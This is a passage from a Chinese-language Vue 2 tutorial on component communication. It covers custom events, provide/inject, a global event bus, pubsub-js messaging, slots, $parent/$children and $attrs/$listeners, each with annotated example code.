helloworld子组件：触发自定义事件

<font style="color:#595959;"><template></font>

<font style="color:#595959;">    <div class="hello"></font>

<font style="color:#595959;">        <h1>子组件helloworld</h1></font>

<font style="color:#595959;">        <button @click="dosome">点击触发自定义事件</button>     </font>

<font style="color:#595959;">    </div></font>

<font style="color:#595959;"></template></font>

<font style="color:#595959;"><script></font>



<font style="color:#595959;">export default {</font>

<font style="color:#595959;">    // 需求：将子组件helloworld的msg数据传递给父组件app</font>

<font style="color:#595959;">    name: 'hellowrod',</font>

<font style="color:#595959;">    data () {</font>

<font style="color:#595959;">        return {</font>

<font style="color:#595959;">            msg:'我是helloworld组件，我有个重要情报！！！'</font>

<font style="color:#595959;">        }</font>

<font style="color:#595959;">    },</font>

<font style="color:#595959;">    methods:{</font>

<font style="color:#595959;">        dosome(){</font>

**<font style="color:#595959;">            // 触发自定义的事件，并可以传递参数，传递多个</font>**

**<font style="color:#595959;">            this.$emit('event2',this.msg,666,8888)</font>**

<font style="color:#595959;">        }</font>

<font style="color:#595959;">    }</font>

<font style="color:#595959;">}</font>

<font style="color:#595959;"></script></font>

#### 3.4.3.2 通过代码给组件绑定事件
**通过ref标记来获取元素，然后用****<font style="color:#FF0000;">$on</font>****给父组件绑定自定义事件**

**触发还是在****<font style="color:#FF0000;">子组件</font>****中**

<font style="color:#595959;"><template></font>

<font style="color:#595959;">    <div class="app"></font>

<font style="color:#595959;">        <h1>app父组件</h1></font>

<font style="color:#595959;">        ·····</font>

<font style="color:#595959;"> </font>**<font style="color:#595959;">       <!-- 第二种方式、通过代码绑定自定义事件 --></font>**

**<font style="color:#595959;">        <helloworld ref="hello" /></font>**

<font style="color:#595959;">    </div></font>

<font style="color:#595959;"></template></font>



<font style="color:#595959;"><script></font>

<font style="color:#595959;">····</font>

<font style="color:#595959;">export default {</font>

<font style="color:#595959;">    name: 'app',</font>

<font style="color:#595959;">  </font>**<font style="color:#595959;">  //在组件挂载完毕后，去绑定自定义事件</font>**

**<font style="color:#FF0000;">    mounted() {</font>**

**<font style="color:#FF0000;">        // 这种方式更加灵活。例如：希望AJAX请求响应回来数据之后再给组件绑定事件。</font>**

**<font style="color:#FF0000;">        this.$refs.hello.$on('event2', this.fun2)</font>**

**<font style="color:#FF0000;">        // 保证这个自定义事件只被触发一次</font>**

**<font style="color:#FF0000;">        //this.$refs.hello.$once('event2', this.fun2)</font>**

**<font style="color:#FF0000;">    },</font>**

<font style="color:#595959;">    methods: {</font>

<font style="color:#595959;">        ····</font>

<font style="color:#595959;">        fun2(msg, ...params) {</font>

<font style="color:#595959;">            console.log('自定义事件触发了····,', msg, params);</font>

<font style="color:#595959;">        }</font>

<font style="color:#595959;">    },</font>

<font style="color:#595959;">        ····</font>

<font style="color:#595959;">}</font>

<font style="color:#595959;"></script></font>

**<font style="color:#FF0000;">触发还是一样在子组件中触发</font>**

**这种方式有个小坑，需要注意的**

**<font style="color:#FF0000;">this.$refs.hello.$on('自定义事件名', 函数)，函数不同的写法，this指向不一样</font>**

<font style="color:#595959;">    mounted() {</font>

<font style="color:#595959;">        </font>**<font style="color:#595959;">// 此处有点个小坑，this的指向问题</font>**

<font style="color:#595959;">        // this.$refs.hello.$on('event2', </font>**<font style="color:#FF0000;">this.fun2</font>**<font style="color:#595959;">) </font>**<font style="color:#595959;">//此时的this是app组件</font>**

<font style="color:#595959;">        // this.$refs.hello.$on('自定义事件名', 函数)，此处的函数如果直接在里面写</font>

**<font style="color:#595959;">        // this.$refs.hello.$on('event2',</font>****<font style="color:#FF0000;"> function ()</font>****<font style="color:#595959;"> {</font>**

**<font style="color:#595959;">        //     // 此时的this是hellowrod组件</font>**

**<font style="color:#595959;">        //     console.log(this);</font>**

**<font style="color:#595959;">        // })</font>**

**<font style="color:#595959;">        this.$refs.hello.$on('event2', </font>****<font style="color:#FF0000;">() =></font>****<font style="color:#595959;"> {</font>**

**<font style="color:#595959;">            // 此时的this是app组件</font>**

**<font style="color:#595959;">            console.log(this);</font>**

**<font style="color:#595959;">        })</font>**

<font style="color:#595959;">},</font>

**<font style="color:#FF0000;">methods 中的函数默认绑定组件实例。</font>**

**<font style="color:#FF0000;">普通函数写法中 this 指向绑定事件的目标组件（如 hellowrod），箭头函数写法中 this 继承外层组件（如 app 组件）。</font>**

#### 3.4.3.3 解绑事件 
**<font style="color:#FF0000;">哪个组件绑定的就找哪个组件解绑</font>**：例如：app组件给mygirl组件绑定事件，到mygirl组件上解绑事件

<font style="color:#595959;"> methods: {</font>

<font style="color:#595959;">        unbinding() {</font>

<font style="color:#595959;">         </font>**<font style="color:#FF0000;">   // this.$off('event2')//解绑1个事件</font>**

**<font style="color:#FF0000;">            //this.$off(['event2', 'event1'])//解绑多个事件</font>**

<font style="color:#595959;">    </font>**<font style="color:#FF0000;">         this.$off()//解绑所有事件</font>**

<font style="color:#595959;">        }</font>

<font style="color:#595959;">    }</font>

注意：vm和vc销毁的时候，所有组件以及子组件当中的事件会全部解绑。

### 3.4.4、provide / inject
provide：可以让我们**<font style="color:#FF0000;">指定想要提供给后代组件的数据或方法</font>**

inject：在任何**<font style="color:#FF0000;">后代组件</font>**中**<font style="color:#FF0000;">接收</font>**想要添加在这个组件上的数据或方法，不管组件嵌套多深都可以直接拿来用

app.vue

**<font style="color:#595959;">// 父组件提供数据</font>**

**<font style="color:#595959;"> </font>****<font style="color:#FF0000;"> </font>****<font style="color:#FF0000;">provide()</font>****<font style="color:#595959;"> {</font>**

**<font style="color:#595959;">    return {</font>**

**<font style="color:#595959;">      name: "jack",</font>**

**<font style="color:#595959;">      age: this.num,</font>**

**<font style="color:#595959;">      someMethod: this.someMethod  // methods 中的方法</font>**

**<font style="color:#595959;">    }</font>**

**<font style="color:#595959;">  },</font>**

<font style="color:#595959;">  methods: {</font>

<font style="color:#595959;">    someMethod() {</font>

<font style="color:#595959;">      console.log("这是注入的方法")</font>

<font style="color:#595959;">    }</font>

<font style="color:#595959;">  },</font>

child.vue

<font style="color:#595959;"><template></font>

<font style="color:#595959;">    <div></font>

<font style="color:#595959;">        <h2 class="child">child组件</h2></font>

<font style="color:#595959;">        <h3>{{ name }}</h3></font>

<font style="color:#595959;">        <h3>{{ age }}</h3></font>

<font style="color:#595959;">        <!-- 不可以直接改数据 --></font>

<font style="color:#595959;">        <!-- <button @click="age++">age++</button> --></font>

<font style="color:#595959;">        <button @click="someMethod">点击触发</button></font>



<font style="color:#595959;">    </div></font>

<font style="color:#595959;"></template></font>



<font style="color:#595959;"><script></font>

<font style="color:#595959;">export default {</font>

<font style="color:#595959;">    name: 'MyChild',</font>

**<font style="color:#595959;">    // 孙组件：获取数据</font>**

**<font style="color:#595959;">   </font>****<font style="color:#FF0000;"> inject:</font>****<font style="color:#595959;"> ["name", 'age', 'someMethod'],</font>**

<font style="color:#595959;">}</font>

<font style="color:#595959;"></script></font>

注意事项：

单向数据流：provide 和 inject 主要用于单向的数据传递，也就是从祖先组件向后代组件传递。虽然后代组件可以修改接收到的数据，但这并不推荐，因为会破坏单向数据流的原则，使数据流向变得复杂，不利于代码的维护。



响应式问题：如果 provide 提供的数据是响应式的（例如来自 data 选项），那么后代组件接收到的基本类型数据也是响应式的，但修改会报错。如果 provide 提供的是复杂数据类型，修改这个值不会报错，但没有响应式。



依赖关系：使用 provide 和 inject 会使组件之间产生一定的依赖关系，因为后代组件依赖于祖先组件提供的数据。所以在使用时要注意组件的结构和数据的流向，避免过度依赖导致代码难以维护。

### 3.4.5、<font style="color:#DF2A3F;">全局事件总线</font>
**<font style="color:#FF0000;">原理：给项目中所有的组件找一个共享的vc对象。把这个共享的对象vc叫做全局事件总线。</font>**

所有的事件都可以绑定到这个共享对象上。所有组件都通过这个全局事件总线对象来传递数据。

这种方式可以完美的完成兄弟组件之间传递数据。这样的共享对象必须具备两个特征：

**(1) 能够让所有的vc共享。**

**(2) 共享对象上有$on、$off、$emit等方法。**

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2025/png/50923934/1742433654114-d545ed01-e0fd-48f8-bc7c-0de99e129e63.png)

在main.js中创建: 两种方案，推荐第二种

<font style="color:#595959;">// 等同于引入vue.js</font>

<font style="color:#595959;">import Vue from "vue";</font>

<font style="color:#595959;">// 导入根组件</font>

<font style="color:#595959;">import App from "./App.vue";</font>



**<font style="color:#595959;">// 全局事件总线第一种方案</font>**

**<font style="color:#595959;">// 获取VueComponent构造函数</font>**

**<font style="color:#595959;">// const VueComponentConstructor = Vue.extend({})</font>**

**<font style="color:#595959;">// 创建一个共享的vc对象,vue底层会解析组件标签new对象，这里没有标签所以要手动new对象</font>**

**<font style="color:#595959;">// </font>****<font style="color:#FF0000;">const globelvc=new VueComponentConstructor()</font>**

**<font style="color:#595959;">// 给Vue的原型对象扩展一个$bus属性，</font>****<font style="color:#FF0000;">$bus属性指向指向这个vc对象</font>**

**<font style="color:#595959;">// 其他所有组件vc都可以直接访问到</font>**

**<font style="color:#595959;">//</font>****<font style="color:#FF0000;"> Vue.prototype.$bus=globelvc</font>**



<font style="color:#595959;">// 关闭生产提示信息</font>

<font style="color:#595959;">Vue.config.productionTip = false;</font>

**<font style="color:#595959;">// 创建Vue实例</font>**

**<font style="color:#595959;">new Vue({</font>**

**<font style="color:#595959;">  render: (h) => h(App),</font>**

**<font style="color:#595959;">  // 全局事件总线第二种方案</font>**

**<font style="color:#FF0000;">  // vm渲染之前，Vue.prototype添加属性$bus</font>**

**<font style="color:#FF0000;">  beforeCreate() {</font>**

**<font style="color:#FF0000;">    Vue.prototype.$bus = this;</font>**

**<font style="color:#FF0000;">  },</font>**

**<font style="color:#595959;">}).$mount("#app");</font>**

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2025/png/50923934/1742433654427-ebd5e06c-6430-402b-8959-3491d3875de1.png)需求：孙组件hellochild向爷组件app传递数据

**<font style="color:#F33232;">永远需要记住的：A组件向B组件传数据，应该在B组件中绑定事件（接）。应该在A组件中触发事件（传）。</font>**

hellochild.vue 触发事件，并传递参数

<font style="color:#595959;">    methods: {</font>

**<font style="color:#595959;">        sendMsgToyy() {</font>**

**<font style="color:#595959;">            </font>****<font style="color:#FF0000;">this.$bus.$emit('receiveMsgtosz', this.msg)</font>**

**<font style="color:#595959;">        }</font>**

<font style="color:#595959;">    }</font>

app.vue组件，绑定事件，接收数据

<font style="color:#595959;">   mounted() {</font>

**<font style="color:#595959;">        </font>****<font style="color:#FF0000;">this.$bus.$on('receiveMsgtosz',(msg)=>{</font>**

**<font style="color:#FF0000;">            console.log('爷爷收到数据了',msg);     </font>**

**<font style="color:#FF0000;">        }</font>****<font style="color:#595959;">)</font>**

<font style="color:#595959;">    },</font>

**<font style="color:#595959;">  // 养成好习惯，组件实例被销毁前，将绑定在$bus上的事件解绑。</font>**

**<font style="color:#595959;">    beforeDestroy() {</font>**

**<font style="color:#595959;">        this.$bus.off('receiveMsgtosz')</font>**

**<font style="color:#595959;">    }</font>**

### 3.4.6、消息订阅与发布
<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2025/png/50923934/1742433654708-87080a33-2e6d-44b8-b72a-6a1cc9670a1f.png)

使用pubsub-js库完成消息订阅与发布。该库可以在任意前端框架中实现消息的订阅与发布。

**安装 pubsub-js： npm i pubsub-js**

**程序中引入pubsub：import pubsub from ‘pubsub-js’**

**引入了一个pubsub对象，通过调用该对象的subscribe进行消息订阅，调用publish进行消息发布。**

需求：兄弟组件的传参

helloworld.vue

<font style="color:#595959;"><template></font>

<font style="color:#595959;">    <div class="hello"></font>

<font style="color:#595959;">        <h2>helloworld组件</h2></font>

<font style="color:#595959;">    </div></font>

<font style="color:#595959;"></template></font>

<font style="color:#595959;"><script></font>

**<font style="color:#595959;">// 导入pubsub</font>**

**<font style="color:#595959;">import pubsub from 'pubsub-js'</font>**

<font style="color:#595959;">export default {</font>

<font style="color:#595959;">    name: 'hellowrod',</font>

<font style="color:#595959;">    data() {</font>

<font style="color:#595959;">        return {</font>

<font style="color:#595959;">            msg: '我是helloworld组件！'</font>

<font style="color:#595959;">        }</font>

<font style="color:#595959;">    },</font>

<font style="color:#595959;">    mounted() {</font>

<font style="color:#595959;">        </font>**<font style="color:#595959;">// 订阅消息</font>**

**<font style="color:#595959;">        this.pid = pubsub.subscribe('msgName', function (msgName, msg) {</font>**

**<font style="color:#595959;">            console.log('收到消息了,消息名字：', msgName, '消息是', msg);</font>**

**<font style="color:#595959;">        })</font>**

**<font style="color:#595959;">    },</font>**

**<font style="color:#595959;">    beforeDestroy() {</font>**

**<font style="color:#595959;">        // 组件销毁前，取消消息的订阅</font>**

**<font style="color:#595959;">        pubsub.unsubscribe(this.pid)</font>**

**<font style="color:#595959;">    }</font>**

<font style="color:#595959;">}</font>

<font style="color:#595959;"></script></font>

hellochild.vue

<font style="color:#595959;"><template></font>

<font style="color:#595959;">    <div class="child"></font>

<font style="color:#595959;">        <h2>hellochild组件</h2></font>

<font style="color:#595959;">        <button @click="sendmsg">发送数据给兄弟</button></font>

<font style="color:#595959;">    </div></font>

<font style="color:#595959;"></template></font>

<font style="color:#595959;"><script></font>

<font style="color:#595959;">// 需求：发送情报给helloworld组件</font>

<font style="color:#595959;">import pubsub from 'pubsub-js'</font>

<font style="color:#595959;">export default {</font>

<font style="color:#595959;">    name: 'hellochild',</font>

<font style="color:#595959;">    data() {</font>

<font style="color:#595959;">        return {</font>

<font style="color:#595959;">            msg: '我是hellochild组件'</font>

<font style="color:#595959;">        }</font>

<font style="color:#595959;">    },</font>

<font style="color:#595959;">    methods: {</font>

**<font style="color:#595959;">        sendmsg() {</font>**

**<font style="color:#595959;">            // 发布消息</font>**

**<font style="color:#595959;">            pubsub.publish('msgName', this.msg)</font>**

**<font style="color:#595959;">        }</font>**

<font style="color:#595959;">    }</font>

<font style="color:#595959;">}</font>

<font style="color:#595959;"></script></font>



<font style="color:#595959;"><style scoped></font>

<font style="color:#595959;">.child {</font>

<font style="color:#595959;">    background-color: green;</font>

<font style="color:#595959;">    padding: 10px;</font>

<font style="color:#595959;">}</font>

<font style="color:#595959;"></style></font>

### 3.4.7、<font style="color:#DF2A3F;">插槽</font>
#### 3.4.7.1、作用
让父组件可以向子组件**指定位置插入html结构**，也是一种组件通信的方式，

使用：**父组件==》子组件，传递html结构 默认插槽，具名插槽**

**子组件==〉父组件：传递数据 作用域插槽**

#### 3.4.7.2、分类
默认插槽，具名插槽，作用域插槽

#### 3.4.7.3、使用方式
##### 1、默认插槽
<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2025/png/50923934/1742433654994-65f7ba0f-dd2d-4dd2-9ffe-dac878e9f3b0.png)

**<font style="color:#595959;">//子组件</font>**

<font style="color:#595959;"><template></font>

<font style="color:#595959;">    <div class="item"></font>

<font style="color:#595959;">        <h3>{{ title }}分类</h3></font>

**<font style="color:#595959;">        <!-- 定义一个插槽（挖个坑，等着组件的使用者进行填充） --></font>**

**<font style="color:#595959;">        </font>****<font style="color:#FF0000;"><slot></font>****<font style="color:#595959;">我是一些默认值，当使用者没有传递具体结构时，我会出现</font>****<font style="color:#FF0000;"></slot></font>**

<font style="color:#595959;">    </div></font>

<font style="color:#595959;"></template></font>



**<font style="color:#595959;">//父组件</font>**

<font style="color:#595959;"><template></font>

<font style="color:#595959;">    <div class="container"></font>

**<font style="color:#595959;">        </font>****<font style="color:#595959;"><Item title="名著"></font>**

**<font style="color:#595959;">	</font>****<font style="color:#FF0000;">//要传递的html结构</font>**

**<font style="color:#595959;">        </font>****<font style="color:#595959;">    <div></font>**

**<font style="color:#595959;">                <h4 v-for="(book, index) in books" :key="index">{{ book }}</h4></font>**

**<font style="color:#595959;">            </div></font>**

**<font style="color:#595959;">        </Item></font>**



<font style="color:#595959;">        <Item title="姓名"></font>

<font style="color:#595959;">            <ul></font>

<font style="color:#595959;">                <li v-for="(name, index) in names" :key="index">{{ name }}</li></font>

<font style="color:#595959;">            </ul></font>

<font style="color:#595959;">        </Item></font>



<font style="color:#595959;">        <Item title="电影"></font>

<font style="color:#595959;">            <ol></font>

<font style="color:#595959;">                <li v-for="(movie, index) in movies" :key="index">{{ movie }}</li></font>

<font style="color:#595959;">            </ol></font>

<font style="color:#595959;">        </Item></font>

<font style="color:#595959;">    </div></font>

<font style="color:#595959;"></template></font>



<font style="color:#595959;"><script></font>

<font style="color:#595959;">import Item from './components/Item'</font>

<font style="color:#595959;">export default {</font>

<font style="color:#595959;">    name: 'App',</font>

<font style="color:#595959;">    components: { Item },</font>

<font style="color:#595959;">    data() {</font>

<font style="color:#595959;">        return {</font>

<font style="color:#595959;">            books: ['《红楼梦》', '《三国演义》', '《金瓶梅》', '《哈利波特》'],</font>

<font style="color:#595959;">            names: ['章三', '李四', '王武', '赵六'],</font>

<font style="color:#595959;">            movies: ['《西虹市首富》', '《宝贝计划》', '《你好，李焕英》']</font>

<font style="color:#595959;">        }</font>

<font style="color:#595959;">    },</font>

<font style="color:#595959;">}</font>

<font style="color:#595959;"></script></font>



<font style="color:#595959;"><style scoped></font>

<font style="color:#595959;">.container {</font>

<font style="color:#595959;">    display: flex;</font>

<font style="color:#595959;">    justify-content: space-around;</font>

<font style="color:#595959;">}</font>

<font style="color:#595959;"></style></font>

##### 2、具名插槽
<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2025/png/50923934/1742433655187-5bcacc87-2996-4369-b05e-e4d54c61cd4d.png)

<font style="color:#595959;">/</font>**<font style="color:#595959;">/子组件</font>**

<font style="color:#595959;"><template></font>

<font style="color:#595959;">    <div class="category"></font>

**<font style="color:#595959;">        <!-- 定义一个插槽 --></font>**

**<font style="color:#595959;">	</font>****<font style="color:#595959;">//插槽位置用name给slot起名字</font>**

**<font style="color:#595959;">       </font>****<font style="color:#FF0000;"> <slot name="center"></font>****<font style="color:#595959;">我是一些默认值，当使用者没有传递具体结构时，我会出现1</font>****<font style="color:#FF0000;"></slot></font>**

**<font style="color:#595959;">        </font>****<font style="color:#FF0000;"><slot name="footer"></font>****<font style="color:#595959;">我是一些默认值，当使用者没有传递具体结构时，我会出现2</font>****<font style="color:#FF0000;"></slot></font>**

<font style="color:#595959;">    </div></font>

<font style="color:#595959;"></template></font>

**<font style="color:#595959;">//父组件</font>**

<font style="color:#595959;"><template></font>

<font style="color:#595959;">    <div class="container"></font>

<font style="color:#595959;">        <Category title="名著"></font>

<font style="color:#595959;">           </font>**<font style="color:#595959;"> </font>****<font style="color:#FF0000;"><!-- slot="center" 第一种写法 --></font>**

**<font style="color:#595959;">	//发送的html结构中通过</font>****<font style="color:#FF0000;">solt</font>****<font style="color:#595959;">的属性值找到对应的插槽位置</font>**

**<font style="color:#595959;">            </font>****<font style="color:#FF0000;"><div slot="center"></font>**

**<font style="color:#595959;">                <h4 v-for="(book, index) in books" :key="index">{{ book }}</h4></font>**

**<font style="color:#595959;">            </font>****<font style="color:#FF0000;"></div></font>**

**<font style="color:#595959;">            <a slot="footer" href="#">更多名著</a></font>**

<font style="color:#595959;">        </Category></font>



<font style="color:#595959;">               <Category title="姓名"></font>

<font style="color:#595959;"> </font>**<font style="color:#FF0000;">     <!-- #center 第二种写法 --></font>**

<font style="color:#595959;">            <ul #center></font>

<font style="color:#595959;">                <li v-for="(name, index) in names" :key="index">{{ name }}</li></font>

<font style="color:#595959;">            </ul></font>

<font style="color:#595959;">            <div class="foot" slot="footer"></font>

<font style="color:#595959;">                <a href="#">单机游戏</a></font>

<font style="color:#595959;">                <a href="#">网络游戏</a></font>

<font style="color:#595959;">            </div></font>

<font style="color:#595959;">        </Category></font>



<font style="color:#595959;">        <Category title="电影"></font>

<font style="color:#595959;">            <ol slot="center"></font>

<font style="color:#595959;">                <li v-for="(movie, index) in movies" :key="index">{{ movie }}</li></font>

<font style="color:#595959;">            </ol></font>

**<font style="color:#FF0000;">        <!-- 第三种写法 --></font>**

**<font style="color:#595959;">//发送的html结构中通过</font>****<font style="color:#FF0000;">v-solt</font>****<font style="color:#595959;">的属性值找到对应的插槽位置</font>**

<font style="color:#595959;">           </font>**<font style="color:#FF0000;"> </font>****<font style="color:#FF0000;"><template v-slot:footer></font>**

<font style="color:#595959;">                </font>**<div class="foot">**

**                    <a href="#">经典</a>**

**                    <a href="#">热门</a>**

**                    <a href="#">推荐</a>**

**                </div>**

**                <h4>欢迎前来观影</h4>**

<font style="color:#595959;">            </font>**<font style="color:#FF0000;"></template></font>**

<font style="color:#595959;">        </Category></font>

<font style="color:#595959;">    </div></font>

<font style="color:#595959;"></template></font>



<font style="color:#595959;"><script></font>

<font style="color:#595959;">import Category from './components/Category'</font>

<font style="color:#595959;">export default {</font>

<font style="color:#595959;">    name: 'App',</font>

<font style="color:#595959;">    components: { Category },</font>

<font style="color:#595959;">    data() {</font>

<font style="color:#595959;">        return {</font>

<font style="color:#595959;">            books: ['《红楼梦》', '《三国演义》', '《金瓶梅》', '《哈利波特》'],</font>

<font style="color:#595959;">            names: ['章三', '李四', '王武', '赵六'],</font>

<font style="color:#595959;">            movies: ['《西虹市首富》', '《宝贝计划》', '《你好，李焕英》']</font>

<font style="color:#595959;">        }</font>

<font style="color:#595959;">    },</font>

<font style="color:#595959;">}</font>

<font style="color:#595959;"></script></font>



<font style="color:#595959;"><style scoped></font>

<font style="color:#595959;">.container,</font>

<font style="color:#595959;">.foot {</font>

<font style="color:#595959;">    display: flex;</font>

<font style="color:#595959;">    justify-content: space-around;</font>

<font style="color:#595959;">}</font>



<font style="color:#595959;">h4 {</font>

<font style="color:#595959;">    text-align: center;</font>

<font style="color:#595959;">}</font>

<font style="color:#595959;"></style></font>

##### 3、作用域插槽
<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2025/png/50923934/1742433655451-b9fe17cb-f9ea-4b0d-87c8-7f38d4a4f1f9.png)

（1）、理解：

数据在组件自身，但根据数据生成的结构需要组件的使用者来决定。（**数据在子组件上，但根据数据遍历出的结构在父组件决定**）

（2）、具体代码

**<font style="color:#595959;">//子组件</font>**

<font style="color:#595959;"><template></font>

<font style="color:#595959;">    <div class="category"></font>

<font style="color:#595959;">        <h3>{{ title }}分类</h3></font>

<font style="color:#595959;">	</font>**<font style="color:#595959;">//子组件中传数据</font>**

<font style="color:#595959;">        </font>**<font style="color:#FF0000;"><slot :booksInfo="books" msg="hello"></font>****<font style="color:#595959;">我是默认的一些内容</font>****<font style="color:#FF0000;"></slot></font>**

<font style="color:#595959;">    </div></font>

<font style="color:#595959;"></template></font>



<font style="color:#595959;"><script></font>

<font style="color:#595959;">export default {</font>

<font style="color:#595959;">    name: 'Category',</font>

<font style="color:#595959;">    props: ['title'],</font>

<font style="color:#595959;">    data() {</font>

<font style="color:#595959;">        return {</font>

<font style="color:#595959;">            books: ['《红楼梦》', '《三国演义》', '《金瓶梅》', '《哈利波特》'],</font>

<font style="color:#595959;">        }</font>

<font style="color:#595959;">    },</font>

<font style="color:#595959;">}</font>

<font style="color:#595959;"></script></font>



**<font style="color:#595959;">//父组件</font>**

<font style="color:#595959;"><template></font>

<font style="color:#595959;">    <div class="container"></font>

<font style="color:#595959;">        <Category title="名著"></font>

<font style="color:#595959;">            </font>**<font style="color:#595959;"><!--1、 booksInfo是子组件传递过来的booksInfo</font>**

**<font style="color:#595959;">                是一个对象，booksInfo.booksInfo才是我们要的数据</font>**

**<font style="color:#595959;">            --></font>**

**<font style="color:#595959;">//在template中用scope接受子组件发送的数据，以对象形式保存</font>**

<font style="color:#595959;">            </font>**<font style="color:#FF0000;"><template scope="booksInfo"></font>**

<font style="color:#595959;">             </font>**<font style="color:#595959;">   <ul></font>**

**<font style="color:#595959;">                    <!-- {{ booksInfo }} --></font>**

**<font style="color:#595959;">                    <li v-for="(book, index) in  booksInfo.booksInfo" :key="index">{{ book }}</li></font>**

**<font style="color:#595959;">                </ul></font>**

<font style="color:#595959;">           </font>**<font style="color:#FF0000;"> </template></font>**

<font style="color:#595959;">        </Category></font>



<font style="color:#595959;">        <Category title="名著"></font>

**<font style="color:#595959;">            <!-- 2、解构的方式，拿到booksInfo --></font>**

**<font style="color:#FF0000;">            <template scope="{booksInfo}"></font>**

**<font style="color:#595959;">                <ol></font>**

**<font style="color:#595959;">                    <li style="color:red" v-for="(book, index) in booksInfo" :key="index">{{ book }}</li></font>**

**<font style="color:#595959;">                </ol></font>**

**<font style="color:#FF0000;">            </template></font>**

<font style="color:#595959;">        </Category></font>



<font style="color:#595959;">        <Category title="名著"></font>

<font style="color:#595959;">     </font>**<font style="color:#595959;">       <!-- 3、slot-scope也可以接收到数据 --></font>**

**<font style="color:#595959;">            <template </font>****<font style="color:#FF0000;">slot-scope="{booksInfo}"</font>****<font style="color:#595959;">></font>**

**<font style="color:#595959;">                <h4 v-for="(book, index) in booksInfo" :key="index">{{ book }}</h4></font>**

**<font style="color:#595959;">            </template></font>**

<font style="color:#595959;">        </Category></font>



<font style="color:#595959;">    </div></font>

<font style="color:#595959;"></template></font>

### 3.4.8、$children / $parent/$root
**$children：**获取到一个**包含所有子组件**(不包含孙子组件)的 VueComponent **对象数组**，可以直接拿到子组件中所有数据和方法等

**$parent：**获取到**一个父节点的 VueComponent 对象**，同样包含父节点中所有数据和方法等

**$root 可以拿到 vm 里的数据和方法**

<font style="color:#595959;">// Parent.vue</font>

<font style="color:#595959;">export default{</font>

<font style="color:#595959;">    mounted(){</font>

<font style="color:#595959;">    </font>**    this.$children[0].someMethod() // 调用第一个子组件的方法**

<font style="color:#595959;">        this.$children[0].name // 获取第一个子组件中的属性</font>

<font style="color:#595959;">    }</font>

<font style="color:#595959;">}</font>



<font style="color:#595959;">// Child.vue</font>

<font style="color:#595959;">export default{</font>

<font style="color:#595959;">    mounted(){</font>

<font style="color:#595959;">        this.$parent.someMethod() // 调用父组件的方法</font>

<font style="color:#595959;">     </font>**   this.$parent.name // 获取父组件中的属性**

<font style="color:#595959;">    }</font>

<font style="color:#595959;">}</font>

### 3.4.9、<font style="color:#4F4F4F;">$attrs / $listeners ( 非父子组件通信 )</font>
#### 1、基本理解
$attrs 是一个包含了父组件传递给子组件但未在子组件的 props 选项中声明的所有属性的对象。通过它，我们可以实现非 props 属性的透传，避免在中间组件中重复定义这些属性。

$listeners 是一个包含了父组件传递给子组件的所有事件监听器的对象。利用它可以将父组件的事件监听器传递给更深层级的子组件，而无需在中间组件里重新绑定这些事件。

当存在多层嵌套的组件结构，且中间组件不需要使用某些属性或处理某些事件，仅起到传递作用时，$attrs 和 $listeners 就能发挥很大的作用，减少中间组件的代码量，提高代码的可维护性。

#### 2 使用方法
以下是一个包含父组件、子组件和孙组件的三层组件结构示例，展示了如何使用 $attrs 和 $listeners 进行通信。

父组件 Parent.vue

<font style="color:#595959;"><template></font>

<font style="color:#595959;">  <div></font>

<font style="color:#595959;">    <!-- 向子组件传递属性和绑定事件 --></font>

<font style="color:#595959;">    <ChildComponent</font>

<font style="color:#595959;">      message="这是一条消息"</font>

<font style="color:#595959;">      count="10"</font>

<font style="color:#595959;">      @click="handleClick"</font>

<font style="color:#595959;">      @custom-event="handleCustomEvent"</font>

<font style="color:#595959;">    /></font>

<font style="color:#595959;">  </div></font>

<font style="color:#595959;"></template></font>



<font style="color:#595959;"><script></font>

<font style="color:#595959;">import ChildComponent from './Child.vue';</font>



<font style="color:#595959;">export default {</font>

<font style="color:#595959;">  components: {</font>

<font style="color:#595959;">    ChildComponent</font>

<font style="color:#595959;">  },</font>

<font style="color:#595959;">  methods: {</font>

<font style="color:#595959;">    handleClick() {</font>

<font style="color:#595959;">      console.log('点击事件被触发');</font>

<font style="color:#595959;">    },</font>

<font style="color:#595959;">    handleCustomEvent() {</font>

<font style="color:#595959;">      console.log('自定义事件被触发');</font>

<font style="color:#595959;">    }</font>

<font style="color:#595959;">  }</font>

<font style="color:#595959;">};</font>

<font style="color:#595959;"></script></font>

子组件 Child.vue

inheritAttrs: false：阻止 Vue 默认将未声明的属性绑定到子组件的根元素上，以便更灵活地控制属性传递。

v-bind=“$attrs”：将 $attrs 对象中的所有属性传递给孙组件。

v-on=“$listeners”：将 $listeners 对象中的所有事件监听器传递给孙组件。

<font style="color:#595959;"><template></font>

<font style="color:#595959;">  <div></font>

<font style="color:#595959;">    <!-- 将 $attrs 和 $listeners 传递给孙组件 --></font>

<font style="color:#595959;">    <GrandChildComponent</font>

<font style="color:#595959;">      v-bind="$attrs"</font>

<font style="color:#595959;">      v-on="$listeners"</font>

<font style="color:#595959;">    /></font>

<font style="color:#595959;">  </div></font>

<font style="color:#595959;"></template></font>



<font style="color:#595959;"><script></font>

<font style="color:#595959;">import GrandChildComponent from './GrandChild.vue';</font>



<font style="color:#595959;">export default {</font>

<font style="color:#595959;">  components: {</font>

<font style="color:#595959;">    GrandChildComponent</font>

<font style="color:#595959;">  },</font>

<font style="color:#595959;">  inheritAttrs: false // 禁止将未声明的属性绑定到根元素</font>

<font style="color:#595959;">};</font>

<font style="color:#595959;"></script></font>

<font style="color:#4D4D4D;">孙组件 GrandChild.vue</font>

<font style="color:#4D4D4D;">通过 $attrs 对象访问接收到的属性并显示。</font>

<font style="color:#4D4D4D;">通过 $emit 触发 click 和 custom-event 事件，这些事件会直接触发父组件中对应的事件处理函数。</font>

<font style="color:#595959;"><template></font>

<font style="color:#595959;">  <div></font>

<font style="color:#595959;">    <p>接收到的消息: {{ $attrs.message }}</p></font>

<font style="color:#595959;">    <p>接收到的计数: {{ $attrs.count }}</p></font>

<font style="color:#595959;">    <button @click="$emit('click')">触发点击事件</button></font>

<font style="color:#595959;">    <button @click="$emit('custom-event')">触发自定义事件</button></font>

<font style="color:#595959;">  </div></font>

<font style="color:#595959;"></template></font>



<font style="color:#595959;"><script></font>

